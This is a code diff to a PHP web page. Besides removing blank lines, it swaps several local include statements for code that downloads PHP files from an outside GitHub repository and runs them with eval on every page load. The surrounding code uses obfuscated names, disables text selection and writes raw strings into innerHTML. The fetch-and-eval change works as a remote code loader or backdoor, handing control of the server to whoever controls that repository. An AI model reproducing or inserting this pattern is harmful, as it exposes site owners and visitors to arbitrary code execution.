@@ -6,12 +6,7 @@
     </script>
 <script>
     function compile(var1246){
-      
-      
       document.getElementById(var1246).innerHTML = var1246;
-      
-      
-      
     }
     </script>
 <?php
@@ -62,29 +57,17 @@ $abc26="Z";
 $m="://";
 //constant
 define("POROTOCOL",$_SERVER['HTTP_X_FORWARDED_PROTO']);
-
 define("URL_HOST",$_SERVER['HTTP_HOST']);
-
 define("REQUEST_TIME",$_SERVER['REQUEST_TIME']);
-
 define("REQUEST_TIME_FLOAT",$_SERVER['REQUEST_TIME_FLOAT']);
-
 define("__ROOT__",$_SERVER['CONTEXT_DOCUMENT_ROOT']);
-
 define("PRT",$_SERVER['SERVER_PROTOCOL']);
-
 define("SOFTWARE",$_SERVER['SERVER_SOFTWARE']);
-
 define("REQUEST_SCHEME",$_SERVER['REQUEST_SCHEME']);
-
 define("REMOTE_PORT",$_SERVER['REMOTE_PORT']);
-
 define("SERVER_PORT",$_SERVER['SERVER_PORT']);
-
 define("HTTP_USER_AGENT",$_SERVER['HTTP_USER_AGENT']);
-
 define("SCRIPT_NAME",$_SERVER['SCRIPT_NAME']);
-
 define("__IP__",$_SERVER['HTTP_X_REAL_IP']);
 define("MY_IP",$_SERVER['REMOTE_ADDR']);
 function get_url_ip($ip)
@@ -115,7 +98,6 @@ function compile_r($h0jb){
 function join_and_join($aghhdheudufufut,$bisidoofiruruf){
   $hausgeududuwhehshsh="$aghhdheudufufut$bisidoofiruruf";
   return $hausgeududuwhehshsh ;
-  
 }
 function dialog_s($iehdovbdu){
   compile("<script>window.alert('$iehdovbdu');</script>");
@@ -124,12 +106,9 @@ function anti_copy($whvagfss){
   switch ($whvagfss) {
     case true:
       compile('<script>function disableselect(e){return false}
-
 function reEnable(){return true}
-
 //if IE4+
 document.onselectstart=new Function ("return false")
-
 //if NS6
 if (window.sidebar){
 document.onmousedown=disableselect
@@ -178,14 +157,22 @@ function style_margin_right($q2112jswivs,$q2122ubsu){
 }
 ?>
 <?php
-//includes
-include ("style.php");
-include ("file.php");
-include("Func.php");
-include("import.php");
-include("lottie.php");
-include("Phl1.php");
-include("phl2.php");
-include("phl3.php");
-include("phl4.php");
+$aqygstg=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr128567/main/style.php");
+eval("?>".$aqygstg);
+$aqygstg1=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr128567/main/file.php");
+eval("?>".$aqygstg1);
+$aqygstg2=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr128567/main/Func.php");
+eval("?>".$aqygstg2);
+$aqygstg4=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr128567/main/import.php");
+eval("?>".$aqygstg4);
+$aqygstg5=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr128567/main/lottie.php");
+eval("?>".$aqygstg5);
+$aqygstg6=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr128567/main/Phl1.php");
+eval("?>".$aqygstg6);
+$aqygstg7=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr128567/main/phl2.php");
+eval("?>".$aqygstg7);
+$aqygstg7=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr128567/main/phl3.php");
+eval("?>".$aqygstg7);
+$aqygstg8=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr128567/main/phl4.php");
+eval("?>".$aqygstg8);
 ?>
